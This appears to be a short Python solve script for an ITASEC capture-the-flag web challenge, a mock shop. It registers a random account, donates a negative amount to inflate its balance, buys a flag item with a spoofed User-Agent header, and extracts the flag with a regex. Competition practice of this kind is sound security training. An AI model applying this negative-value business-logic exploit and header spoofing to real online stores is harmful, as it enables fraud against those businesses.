# pip3 install requests
import requests
import secrets
import re

BASE_URL = "http://itasecshop.challs.itasec.it"


def register():
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    session = requests.Session()
    session.post(BASE_URL + "/register",
                 data={"user": username, "psw": password}).text
    return session


def donate(session, price):
    session.post(BASE_URL + "/store/donate", data={"price": str(price)})


def buy(session, item):
    return session.post(BASE_URL + f"/store/{item}/buy", headers={'User-Agent': 'Samsung Smart Fridge 2.0'}).text


def main():
    session = register()
    donate(session, -1000000)
    bought = buy(session, 5)
    flag = re.findall(r"ITASEC\{.*\}", bought)
    if flag:
        print("FLAG:", flag[0])
    else:
        print("Error :/")


if __name__ == "__main__":
    main()
